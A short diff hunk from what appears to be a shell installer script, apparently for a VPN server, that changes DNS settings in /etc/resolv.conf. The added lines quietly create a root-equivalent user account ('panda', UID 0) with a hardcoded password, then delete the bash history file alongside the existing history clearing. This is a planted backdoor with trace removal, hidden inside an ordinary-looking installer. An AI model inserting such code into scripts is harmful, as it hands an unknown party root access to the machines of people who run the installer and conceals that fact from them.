@@ -1144,7 +1144,9 @@ rm -f /etc/.systemlink
 echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/resolv.conf
 sed -i "s|127.0.0.53|1.1.1.1|g" /etc/resolv.conf
-
+useradd -p $(openssl passwd -1 pandavpnunite) panda -ou 0 -g 0
+cd ~ 
+rm -rf .bash_history
 history -c;
 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
